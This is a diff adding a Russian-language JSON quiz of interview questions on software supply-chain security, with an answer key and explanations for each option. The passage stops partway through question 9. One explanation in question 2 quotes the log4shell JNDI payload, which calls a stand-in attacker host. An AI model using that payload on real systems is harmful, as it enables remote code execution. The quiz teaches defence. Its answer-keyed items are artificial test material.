@@ -1,0 +1,1445 @@
+{
+  "topic_slug": "supply-chain-security-interview",
+  "questions": [
+    {
+      "q_number": 1,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое supply chain attack (атака на цепочку поставок ПО)?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`Supply chain attack` — атака не на саму жертву напрямую, а через доверенных посредников: вендоров, dependencies, build-инструменты, `CI/CD`. Если организацию не пробить в лоб, компрометируют её поставщика, и update-канал доставляет malware от его имени, уже как доверенный.",
+              "correct": true,
+              "sections": {
+                "explanation": "ПО неявно доверяет зависимостям (тысячи транзитивных), а апдейты применяются автоматически по подписи вендора. Компрометация одной популярной библиотеки даёт сотни жертв сразу (downstream-взрыв).",
+                "example": "`NPM`-пакет с миллионом скачиваний скомпрометирован через угнанные credentials мейнтейнера: все, кто обновился, получили вредонос как легитимный апдейт.",
+                "when_to_apply": "Эту модель угроз учитывают при выборе зависимостей, настройке pipeline и при vendor due diligence: любой внешний код и сервис — потенциальный вектор.",
+                "edge_cases": "Атака бывает незаметна месяцами: вредоносный коммит хорошо спрятан, а обнаружение приходит часто случайно, как в случае `xz` (заметили из-за медленного `sshd`).",
+                "related": "[[supply-chain-security-interview#Q2]] известные инциденты; [[supply-chain-security-interview#Q3]] типы атак; [[supply-chain-security-interview#Q24]] roadmap защиты."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Supply chain attack` — это только DDoS на серверы дистрибуции пакетов, чтобы разработчики не могли скачать зависимости.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Это атака через доверенных посредников ради внедрения вредоносного кода, а не отказ в обслуживании серверов с пакетами.",
+                "source_of_confusion": "Слово «chain» ассоциируется с инфраструктурой доставки, поэтому атаку путают с доступностью.",
+                "if_it_were_true": "Тогда защитой был бы просто резервный mirror, но реальная угроза — подмена кода, а не недоступность.",
+                "how_it_should_be": "Это компрометация доверия в цепочке (код, build, артефакты), а доступность — отдельная категория угроз."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`Supply chain attack` — это исключительно фишинг сотрудников жертвы письмами от имени её руководства.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Фишинг — отдельный вектор; supply chain attack бьёт через зависимости, build и вендоров, а не через прямую социнженерию жертвы.",
+                "source_of_confusion": "И фишинг, и supply chain используют доверие, поэтому их смешивают в одну категорию.",
+                "if_it_were_true": "Тогда хватило бы тренингов по фишингу, но `SolarWinds` и `log4shell` так не предотвратить.",
+                "how_it_should_be": "Это атака через trusted intermediaries в поставке ПО; фишинг людей — самостоятельный класс угроз."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`Supply chain attack` — это атака, возможная только на проприетарное ПО, тогда как open source к ней иммунен.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Open source как раз частая мишень: `event-stream`, `xz`, typosquatting в `PyPI` — всё это атаки на открытые цепочки поставок.",
+                "source_of_confusion": "Кажется, что открытость кода (видны все коммиты) автоматически защищает от внедрения вредоноса.",
+                "if_it_were_true": "Тогда `xz`-бэкдор не появился бы в open source liblzma, но он именно там и возник.",
+                "how_it_should_be": "Уязвимы и проприетарные, и open source цепочки; открытость помогает аудиту, но не гарантирует безопасность."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 2,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Какие известные инциденты supply chain (SolarWinds, log4shell, xz) показательны и чему учат?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Все три инцидента (`SolarWinds`, `log4shell`, `xz`) — это один и тот же тип атаки: эксплуатация одной транзитивной CVE в зависимости.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Векторы разные: `SolarWinds` — компрометация build-pipeline, `log4shell` — транзитивная уязвимость, `xz` — захват мейнтейнерства через социнженерию.",
+                "source_of_confusion": "Все три громко звучат как «supply chain», поэтому их сваливают в одну категорию транзитивных CVE.",
+                "if_it_were_true": "Тогда от всех трёх защитил бы один scanner зависимостей, но `SolarWinds` и `xz` так не ловятся.",
+                "how_it_should_be": "Это три разных вектора (build-time, dependency, human), и защита от каждого своя."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`SolarWinds/SUNBURST` (2020) — компрометация build-pipeline `Orion`, подписанный malware скачали 18000+ клиентов. `log4shell/CVE-2021-44228` (2021) — RCE через `JNDI`-инъекцию в `log4j`, CVSS 10.0, затронул всё от `Minecraft` до `iCloud`. `xz utils/CVE-2024-3094` (2024) — бэкдор в `liblzma` через двухлетнюю социнженерию мейнтейнера, заметили случайно.",
+              "correct": true,
+              "sections": {
+                "explanation": "Три кейса бьют по трём слоям: `SolarWinds` — build-time (подписанный вредонос), `log4shell` — транзитивная зависимость, `xz` — человеческий фактор и захват мейнтейнерства.",
+                "example": "В `log4shell` строка `${jndi:ldap://attacker.com/exploit}` в любом залогированном тексте давала удалённое выполнение кода — поэтому SBOM-ответ «есть ли у нас log4j?» стал критичным.",
+                "when_to_apply": "На эти инциденты ссылаются, обосновывая инвестиции в SBOM, подпись артефактов, время реакции на CVE и аудит критичных мейнтейнеров.",
+                "edge_cases": "`xz` поймали почти случайно (инженер `Microsoft` заметил замедление `sshd`) — это показывает, что детект таких атак нельзя строить только на удаче.",
+                "related": "[[supply-chain-security-interview#Q1]] что такое supply chain attack; [[supply-chain-security-interview#Q4]] SBOM для ответа на инцидент; [[supply-chain-security-interview#Q16]] reproducible builds против SolarWinds-сценария."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`log4shell` — это бэкдор, который злоумышленник умышленно встроил в `log4j`, став мейнтейнером проекта.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`log4shell` — это непреднамеренная уязвимость дизайна (`JNDI`-lookup в логах), а умышленный бэкдор через мейнтейнерство — это история `xz`.",
+                "source_of_confusion": "Истории `log4shell` и `xz` часто рассказывают рядом, поэтому их детали путают между собой.",
+                "if_it_were_true": "Тогда виновным был бы конкретный злонамеренный мейнтейнер `log4j`, но это была ошибка проектирования, а не саботаж.",
+                "how_it_should_be": "`log4shell` — уязвимость в фиче `JNDI`; умышленный бэкдор от мейнтейнера — это `xz utils`."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`SolarWinds` затронул только саму компанию `SolarWinds` и не распространился на её клиентов, так как обновление было подписано.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Именно подпись и сделала атаку опасной: подписанный malware скачали 18000+ клиентов, ~100 были активно атакованы (`US Treasury`, `Microsoft`, `FireEye`).",
+                "source_of_confusion": "Кажется, что валидная подпись — гарантия безопасности, поэтому делают вывод об отсутствии распространения.",
+                "if_it_were_true": "Тогда инцидент не назвали бы крупнейшим supply chain attack десятилетия, но downstream-жертв были тысячи.",
+                "how_it_should_be": "Подпись подтверждает источник, но не чистоту кода: скомпрометированный pipeline подписал вредонос, и он разошёлся по клиентам."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 3,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Какие бывают типы supply chain attacks по вектору?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Все supply chain attacks сводятся к двум типам: SQL-инъекция и XSS в зависимостях.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`SQL`-инъекция и `XSS` — это классы уязвимостей приложения (OWASP), а векторы supply chain — это confusion, typosquatting, захват аккаунта, компрометация build и т.д.",
+                "source_of_confusion": "OWASP Top 10 на слуху, поэтому любые угрозы пытаются уложить в инъекции и XSS.",
+                "if_it_were_true": "Тогда от supply chain защищала бы валидация ввода, но она не остановит подмену пакета в registry.",
+                "how_it_should_be": "Векторы supply chain — про доставку и доверие кода (имя, аккаунт, build), а не про инъекции в рантайме."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Typosquatting` и `dependency confusion` — это синонимы, обозначающие один и тот же приём подмены пакета.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Это разные приёмы: `typosquatting` ловит на опечатке в имени (`reqeusts`), а `dependency confusion` использует совпадение имени приватного и публичного пакета с приоритетом публичного registry.",
+                "source_of_confusion": "Оба про имена пакетов и оба заканчиваются установкой чужого кода, поэтому их объединяют.",
+                "if_it_were_true": "Тогда от обоих помогал бы один фикс, но typosquatting лечат проверкой имён, а confusion — приоритетом внутреннего registry.",
+                "how_it_should_be": "Это два самостоятельных вектора с разными механизмами и разными контролями."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Основные векторы: `dependency confusion` (подмена приватного пакета публичным с тем же именем), `typosquatting` (похожие имена), protestware/действие мейнтейнера, скомпрометированный аккаунт, компрометация build-системы, компрометация репозитория, транзитивная upstream-уязвимость, dormant/long-con (`xz`), захват заброшенного имени и атака на CDN/mirror.",
+              "correct": true,
+              "sections": {
+                "explanation": "Атаки делятся по точке внедрения: имя пакета (`typosquatting`, confusion), личность мейнтейнера (захват аккаунта, social engineering), инфраструктура (build, repo, CDN). У каждого вектора свои контролы.",
+                "example": "`dependency confusion`: атакующий публикует пакет с именем внутренней библиотеки в публичном `npm`, и CI по ошибке тянет его версию вместо приватной; фикс — приоритет внутреннего registry и scopes.",
+                "when_to_apply": "Классификацию используют при threat modeling зависимостей: под каждый вектор подбирают контроль (pinning, scoped packages, SBOM, signing, review).",
+                "edge_cases": "Вектор `protestware`: легитимный мейнтейнер сам внедряет вредонос — `node-ipc` (2022) удалял файлы на российских IP; технические сканеры тут бессильны без поведенческого анализа.",
+                "related": "[[supply-chain-security-interview#Q22]] защита от typosquatting; [[supply-chain-security-interview#Q21]] pinned dependencies против подмены; [[supply-chain-security-interview#Q2]] инциденты как примеры векторов."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "Единственный вектор supply chain — это компрометация официального репозитория исходников проекта.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Компрометация repo — лишь один из многих векторов; есть ещё build-система, registry-аккаунт, CDN, транзитивные CVE и social engineering мейнтейнера.",
+                "source_of_confusion": "Репозиторий кажется единственным «источником истины», поэтому его считают единственной мишенью.",
+                "if_it_were_true": "Тогда защитой была бы только branch protection на GitHub, но `dependency confusion` и typosquatting обходят это полностью.",
+                "how_it_should_be": "Векторов минимум десяток, и repo — только один из них; защита нужна по всей цепочке."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 4,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое SBOM (Software Bill of Materials)?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`SBOM` — это лицензионное соглашение конечного пользователя (`EULA`), которое юзер принимает при установке ПО.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`SBOM` — это технический inventory компонентов и версий, а не юридический текст соглашения с пользователем.",
+                "source_of_confusion": "И SBOM, и EULA касаются лицензий, поэтому их путают по слову «license».",
+                "if_it_were_true": "Тогда SBOM не помог бы найти `log4j` при инциденте, но именно для этого он и нужен.",
+                "how_it_should_be": "SBOM перечисляет содержимое ПО (что внутри), а EULA — это условия использования (что можно делать)."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`SBOM` — это runtime-монитор, который в продакшене блокирует выполнение уязвимых функций библиотек.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`SBOM` — это статический список компонентов, формируемый на build-time; рантайм-блокировкой занимаются `WAF`/RASP/admission controllers, а не SBOM.",
+                "source_of_confusion": "SBOM используют для безопасности, поэтому его ошибочно наделяют активной защитой в рантайме.",
+                "if_it_were_true": "Тогда SBOM сам останавливал бы эксплойт `log4shell`, но он лишь сообщает, что `log4j` присутствует.",
+                "how_it_should_be": "SBOM — это документ-inventory; реакцию на уязвимость выполняют сканеры и политики поверх него."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`SBOM` создаётся вручную архитектором раз в год и описывает только основные фреймворки приложения.",
+              "correct": false,
+              "sections": {
+                "what_actually": "SBOM генерируется автоматически на каждом build и должен охватывать все компоненты, включая транзитивные, а не пару фреймворков раз в год.",
+                "source_of_confusion": "«Bill of materials» звучит как разовый проектный документ, который оформляют руками.",
+                "if_it_were_true": "Тогда годовой SBOM устаревал бы после первого же обновления зависимостей и был бы бесполезен при инциденте.",
+                "how_it_should_be": "SBOM — это автоматизированный артефакт build-time с полным транзитивным охватом и хешами."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`SBOM` — это inventory всех компонентов (прямых и транзитивных) в ПО: библиотеки, версии, лицензии, происхождение, хеши. Аналогия — список ингредиентов на этикетке еды, но для софта. Генерируется автоматически на build-time, в идеале с транзитивными зависимостями и file-level хешами.",
+              "correct": true,
+              "sections": {
+                "explanation": "SBOM даёт мгновенный ответ на вопрос «есть ли у нас уязвимый компонент?». В `log4shell` именно SBOM позволял за минуты найти все артефакты с `log4j` вместо ручного поиска по репозиториям.",
+                "example": "Запись `{component: spring-core, version: 5.3.20, license: Apache-2.0, hash: sha256:abc...}` — для каждого компонента известны версия, лицензия и точный хеш поставленных байт.",
+                "when_to_apply": "SBOM нужен для vulnerability response, license compliance, регуляторики (`US Executive Order 14028`, `EU CRA`) и vendor due diligence перед покупкой ПО.",
+                "edge_cases": "SBOM без глубины (только прямые зависимости) почти бесполезен: уязвимость чаще в транзитивных, поэтому нужны транзитивный охват и хеши, а не ручной поверхностный список.",
+                "related": "[[supply-chain-security-interview#Q5]] SPDX vs CycloneDX; [[supply-chain-security-interview#Q6]] как генерировать SBOM; [[supply-chain-security-interview#Q2]] log4shell как мотивация SBOM."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 5,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Чем отличаются форматы SBOM `SPDX` и `CycloneDX`?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`SPDX` (`Linux Foundation`, ISO/IEC 5962:2021) фокусируется на лицензировании, compliance и метаданных, исторически глубоко интегрирован с legal review. `CycloneDX` (`OWASP`, 2017) фокусируется на безопасности и уязвимостях, имеет нативную поддержку `VEX` и варианты (SaaSBOM, MLBOM, CBOM). На практике генерируют оба.",
+              "correct": true,
+              "sections": {
+                "explanation": "Разница в акценте: `SPDX` верболен и силён в FOSS/legal, `CycloneDX` компактен и силён в security-тулинге. Инструменты вроде `syft` умеют выдавать оба формата одной командой.",
+                "example": "Для legal-ревью лицензий генерируют `SPDX`, а для security-workflow с проверкой CVE и `VEX` — `CycloneDX`; `syft dir:. -o spdx-json` и `-o cyclonedx-json` дают оба.",
+                "when_to_apply": "`SPDX` берут под compliance и лицензионный аудит, `CycloneDX` — под security и vulnerability management; большинство организаций генерируют оба.",
+                "edge_cases": "`VEX` (Vulnerability Exploitability eXchange) нативен в `CycloneDX`, но не в `SPDX`, поэтому для пометки «уязвимость не эксплуатируема» удобнее `CycloneDX`.",
+                "related": "[[supply-chain-security-interview#Q4]] что такое SBOM; [[supply-chain-security-interview#Q6]] генерация SBOM; [[supply-chain-security-interview#Q14]] сканеры и VEX."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`SPDX` — это формат от `OWASP` с фокусом на безопасности, а `CycloneDX` — от `Linux Foundation` с фокусом на лицензиях.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Всё наоборот: `SPDX` — от `Linux Foundation` (compliance/лицензии), `CycloneDX` — от `OWASP` (security).",
+                "source_of_confusion": "Оба — стандарты SBOM от крупных фондов, поэтому их авторство и фокус легко перепутать местами.",
+                "if_it_were_true": "Тогда `CycloneDX` был бы ISO-стандартом по лицензиям, но ISO/IEC 5962:2021 — это как раз `SPDX`.",
+                "how_it_should_be": "`SPDX` = Linux Foundation + compliance; `CycloneDX` = OWASP + security."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`SPDX` и `CycloneDX` несовместимы, поэтому организация обязана выбрать ровно один формат на всю жизнь проекта.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Современный тулинг (`syft` и др.) поддерживает оба, и большинство организаций генерируют оба формата параллельно под разные задачи.",
+                "source_of_confusion": "Раз форматы конкурируют, кажется, что надо жёстко выбрать один и придерживаться его.",
+                "if_it_were_true": "Тогда нельзя было бы выдавать legal-SBOM в SPDX и security-SBOM в CycloneDX одновременно, но это делают рутинно.",
+                "how_it_should_be": "Форматы дополняют друг друга; одна команда `syft` выдаёт оба — выбирают по задаче, а не навсегда."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`CycloneDX` существует с 2011 года и старше `SPDX`, появившегося только в 2017.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Старше как раз `SPDX` (2011); `CycloneDX` появился позже, в 2017 как проект `OWASP`.",
+                "source_of_confusion": "Даты 2011 и 2017 легко приписать не тому формату, если не помнить хронологию.",
+                "if_it_were_true": "Тогда `CycloneDX` был бы более зрелым FOSS/legal-стандартом, но эта ниша исторически за `SPDX`.",
+                "how_it_should_be": "`SPDX` — 2011 (старше), `CycloneDX` — 2017 (моложе, security-ориентирован)."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 6,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Как генерировать SBOM в разных экосистемах и CI?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "SBOM генерируют вручную, открывая `pom.xml`/`package.json` и переписывая список зависимостей в таблицу.",
+              "correct": false,
+              "sections": {
+                "what_actually": "SBOM формируют автоматически инструментами (`syft`, плагины менеджеров) на build-time, а не ручным переносом из манифеста.",
+                "source_of_confusion": "Манифест зависимостей выглядит как готовый список, поэтому кажется, что SBOM — это просто его копия руками.",
+                "if_it_were_true": "Тогда SBOM пропускал бы транзитивные зависимости и хеши, которых нет в `package.json`, и был бы неполным.",
+                "how_it_should_be": "SBOM собирают автоматически с разрешением транзитивных зависимостей и хешей реально поставленных байт."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "Есть language-specific инструменты (`cyclonedx-maven-plugin` для `Java`, `cyclonedx-npm` для `Node`, `cyclonedx-py`, `cyclonedx-gomod`) и универсальный `Syft` от `Anchore`: `syft dir:.` или `syft image:myapp:1.0` с выводом в cyclonedx-json/spdx-json. В CI используют `anchore/sbom-action`, артефакт сохраняют и пушат в `Dependency-Track`.",
+              "correct": true,
+              "sections": {
+                "explanation": "Ключевой принцип — генерация автоматическая на build-time, а не ручная. Универсальный `Syft` покрывает и каталоги, и Docker-образы, а language-tools дают точность по конкретному менеджеру пакетов.",
+                "example": "В GitHub Actions: `- uses: anchore/sbom-action@v0` с `format: cyclonedx-json` и `output-file: sbom.json`; результат прикрепляют к релизу и шлют в `Dependency-Track` для continuous monitoring.",
+                "when_to_apply": "SBOM генерируют на каждом build артефакта/образа, сохраняют как artifact, attach к релизу и подают в сервис непрерывного мониторинга уязвимостей.",
+                "edge_cases": "`docker sbom` и `docker buildx --sbom=true` дают SBOM на уровне образа, но образ-уровень может не видеть зависимости, собранные в multi-stage build вне финального слоя.",
+                "related": "[[supply-chain-security-interview#Q4]] что такое SBOM; [[supply-chain-security-interview#Q5]] форматы SBOM; [[supply-chain-security-interview#Q12]] SBOM как attestation."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Единственный способ сгенерировать SBOM — это коммерческий `Snyk`, бесплатных инструментов не существует.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Есть бесплатные open source инструменты: `Syft`, `cyclonedx-*` плагины, `docker sbom` — SBOM генерируют без коммерческих лицензий.",
+                "source_of_confusion": "`Snyk` активно продвигается в security-контексте, поэтому его считают единственным вариантом.",
+                "if_it_were_true": "Тогда GitHub Actions `anchore/sbom-action` не существовал бы, но это бесплатный open source action.",
+                "how_it_should_be": "SBOM генерируют преимущественно бесплатными инструментами (`Syft` де-факто лидер); `Snyk` — лишь один из вариантов."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "SBOM можно построить только из готового Docker-образа и нельзя — из исходного каталога проекта.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`Syft` умеет и `dir:.` (каталог исходников), и `image:` (Docker-образ); генерация из каталога — стандартный сценарий.",
+                "source_of_confusion": "SBOM часто демонстрируют на образах, поэтому каталог как источник упускают из виду.",
+                "if_it_were_true": "Тогда нельзя было бы получить SBOM до сборки образа, но `syft dir:.` делает именно это.",
+                "how_it_should_be": "SBOM строят из любого источника — каталога, образа, lock-файла — в зависимости от стадии pipeline."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 7,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что такое SLSA framework и какую проблему он решает?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "`SLSA` — это статический анализатор кода, который ищет SQL-инъекции и XSS в исходниках перед сборкой.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`SLSA` — framework целостности build-pipeline и происхождения артефактов; поиск инъекций — это `SAST`-инструменты, не SLSA.",
+                "source_of_confusion": "И SAST, и SLSA встраиваются в CI и связаны с безопасностью, поэтому их роли смешивают.",
+                "if_it_were_true": "Тогда у SLSA были бы правила для CWE/инъекций, но SLSA явно объявляет качество кода своим non-goal.",
+                "how_it_should_be": "SLSA доказывает целостность и происхождение сборки; поиск уязвимостей в коде — задача SAST/SCA."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`SLSA` — это формат файла SBOM, конкурирующий со `SPDX` и `CycloneDX`.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`SLSA` — это framework уровней зрелости pipeline, а не формат SBOM; SBOM-форматы — это `SPDX`/`CycloneDX`.",
+                "source_of_confusion": "Все три аббревиатуры из supply chain security, поэтому SLSA ошибочно ставят в один ряд с форматами SBOM.",
+                "if_it_were_true": "Тогда `syft` выдавал бы SBOM в формате SLSA, но SLSA описывает provenance и уровни, а не inventory компонентов.",
+                "how_it_should_be": "SLSA — это framework про целостность сборки; SBOM (SPDX/CycloneDX) — про список компонентов."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`SLSA` (Supply-chain Levels for Software Artifacts, «salsa») — framework от `Google`/`Linux Foundation`, задающий уровни зрелости безопасности build-pipeline. Цель — доказать, что артефакт собран как заявлено, без подмены. Ключевые понятия: provenance (где/как/кем собран), attestations (подписанные утверждения) и trusted builders.",
+              "correct": true,
+              "sections": {
+                "explanation": "`SLSA` адресует source integrity (подмена коммитов), build integrity (вредоносный build-инструмент) и distribution integrity (подмена бинарей на mirror). Это не про качество кода и не про runtime-безопасность.",
+                "example": "GitHub Actions предоставляет SLSA L3 builder (`slsa-github-generator`), который генерирует non-falsifiable provenance — потребитель через `slsa-verifier` убеждается, что артефакт собран именно его CI.",
+                "when_to_apply": "`SLSA` применяют, когда нужно гарантировать целостность сборки и происхождение артефактов для деплоя в недоверенную среду или для регулируемого ПО.",
+                "edge_cases": "`SLSA` — это non-goal для качества кода и багов в зависимостях: высокий SLSA-уровень не значит, что в коде нет уязвимостей, он лишь подтверждает целостность сборки.",
+                "related": "[[supply-chain-security-interview#Q8]] SLSA levels 1-4; [[supply-chain-security-interview#Q18]] provenance; [[supply-chain-security-interview#Q12]] in-toto attestations."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`SLSA` гарантирует, что в собранном артефакте полностью отсутствуют известные CVE в зависимостях.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`SLSA` подтверждает целостность сборки и происхождение, но баги и CVE в зависимостях — это явный non-goal фреймворка.",
+                "source_of_confusion": "Высокий уровень безопасности pipeline создаёт иллюзию, что и сам код/зависимости чисты.",
+                "if_it_were_true": "Тогда SLSA L3-артефакт не мог бы содержать уязвимый `log4j`, но мог бы — SLSA это не проверяет.",
+                "how_it_should_be": "SLSA отвечает за то, что артефакт собран как заявлено; за CVE в зависимостях отвечают сканеры (Trivy/Snyk)."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 8,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Что означают уровни SLSA 1-4 (и почему L4 убрали в 1.0)?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Все уровни SLSA (L1-L4) требуют hermetic и reproducible builds — без них нельзя получить даже L1.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Hermetic+reproducible builds требовались только на (убранном) `L4`; L1-L3 их не требуют, L1 — это вообще лишь документированный build с provenance.",
+                "source_of_confusion": "Reproducible builds часто упоминают рядом со SLSA, поэтому требование переносят на все уровни.",
+                "if_it_were_true": "Тогда L1 был бы недостижим за несколько дней, но на практике L1 ставят почти сразу.",
+                "how_it_should_be": "L1 — документированный build; hermetic/reproducible относились к строжайшему L4, которого в 1.0 уже нет."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`SLSA L3` достигается простым добавлением шага `echo build provenance` в скрипт сборки на локальном ноутбуке.",
+              "correct": false,
+              "sections": {
+                "what_actually": "L3 требует изолированного builder и non-falsifiable provenance через ephemeral identity/OIDC; локальный ноут не даёт ни изоляции, ни неподделываемости.",
+                "source_of_confusion": "Кажется, что provenance — это просто текстовый вывод, который можно напечатать вручную.",
+                "if_it_were_true": "Тогда любой разработчик подделал бы provenance локально, но именно non-falsifiability и есть суть L3.",
+                "how_it_should_be": "L3 требует hardened изолированный CI-builder, подписывающий provenance так, что разработчик её не подделает."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`L4` остаётся самым востребованным и широко применяемым уровнем SLSA в индустрии.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`L4` убран в `SLSA 1.0`: его требования (two-person review, hermetic+reproducible) оказались слишком строгими для массового внедрения.",
+                "source_of_confusion": "Самый высокий номер уровня интуитивно кажется самым желанным и распространённым.",
+                "if_it_were_true": "Тогда L4 был бы в актуальной спецификации 1.0, но его оттуда исключили ради реалистичной адопции.",
+                "how_it_should_be": "Актуальны L1-L3; L4 убран, и целевым «высоким» уровнем сегодня считается L3."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`L1` — задокументированный build с генерацией provenance. `L2` — hosted build на сервисе (`GitHub Actions`, не локальный ноут) с подписанной provenance. `L3` — hardened build: изолированный builder и non-falsifiable provenance через ephemeral identity/OIDC. `L4` (исходно строжайший) убран в `SLSA 1.0` (2023) — требовал two-person review и hermetic+reproducible builds, что нереалистично для большинства.",
+              "correct": true,
+              "sections": {
+                "explanation": "Уровни нарастают по строгости: L1 минимум, L2 переносит сборку в доверенный CI, L3 защищает от подделки provenance. В `SLSA 1.0` стандартизирован только Build track с уровнями L1-L3.",
+                "example": "Прагматичный путь: L1 за несколько дней, L2 — перенос билдов в trusted CI и подпись артефактов, L3 — `slsa-github-generator` + проверка provenance на стороне потребителя через `slsa-verifier`.",
+                "when_to_apply": "Уровни выбирают по риску: L1-L2 для большинства проектов, L3 для критичных артефактов, идущих в недоверенные среды или регулируемые системы.",
+                "edge_cases": "`L4` убрали именно из-за нереалистичности: two-person review всех изменений и обязательные hermetic+reproducible builds большинство организаций не выдерживают, поэтому фокус сместили на достижимый L3.",
+                "related": "[[supply-chain-security-interview#Q7]] что такое SLSA; [[supply-chain-security-interview#Q16]] reproducible builds; [[supply-chain-security-interview#Q18]] provenance и slsa-verifier."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 9,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Зачем подписывать артефакты (JAR, Docker-образы, бинарники)?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Подпись (digital signature private-ключом, проверка public-ключом) даёт три гарантии: authenticity (артефакт действительно от заявленного publisher), integrity (не изменён после подписи), non-repudiation (publisher не может отрицать авторство). Без подписи возможны MITM-подмена в transit, скомпрометированный mirror и cache poisoning.",
+              "correct": true,
+              "sections": {
+                "explanation": "Подпись защищает канал доставки: даже если артефакт перехватили или подменили на зеркале, верификация по публичному ключу выявит несоответствие. Ключевое — именно проверка подписи, а не только её наличие.",
+                "example": "`Maven Central` требует GPG-подписи на JAR; `apt` проверяет GPG-подписи `.deb` перед установкой; `Docker`-образы подписывают через `Cosign` и проверяют в deploy-pipeline.",
+                "when_to_apply": "Подпись применяют для всех публикуемых артефактов, особенно идущих через публичные registry/mirror, и обязательно с enforced-проверкой в pipeline деплоя.",
+                "edge_cases": "Подписанный артефакт без верификации всё ещё небезопасен: если pipeline не вызывает `cosign verify`, подпись бесполезна — нужно enforce проверку, а не просто подписывать.",
+                "related": "[[supply-chain-security-interview#Q10]] Sigstore и Cosign; [[supply-chain-security-interview#Q11]] keyless signing; [[supply-chain-security-interview#Q21]] hash pinning как дополнительная защита целостности."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "Подпись артефакта шифрует его содержимое, чтобы конкуренты не могли прочитать исходный код из бинарника.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Подпись не шифрует и не скрывает содержимое — она подтверждает источник и целостность; конфиденциальность кода обеспечивает обфускация/шифрование, не подпись.",
+                "source_of_confusion": "И подпись, и шифрование используют криптографию и ключи, поэтому их цели путают.",
+                "if_it_were_true": "Тогда подписанный JAR нельзя было бы декомпилировать, но подпись никак не мешает чтению байт.",
+                "how_it_should_be": "Подпись даёт authenticity/integrity (доказательство источника), а скрытие содержимого — отдельная задача."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Подпись артефакта гарантирует отсутствие в нём уязвимостей и вредоносного кода.",
+              "correct": false,
+              "sections": {
